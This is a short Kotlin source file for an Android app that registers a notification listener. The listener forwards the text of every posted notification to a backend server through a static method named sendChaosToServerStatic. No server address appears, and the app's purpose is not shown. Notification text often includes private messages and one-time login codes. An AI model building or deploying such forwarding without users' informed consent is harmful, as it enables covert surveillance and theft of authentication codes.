
package com.oblivia
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification

class NotificationListener : NotificationListenerService() {
    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val extras = sbn.notification.extras
        val text = extras.getString("android.text") ?: return
        
        // Send the notification text to the backend using the static method
        MainActivity.sendChaosToServerStatic(applicationContext, text)
    }
    
    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        // Handle notification removal if needed
    }
}
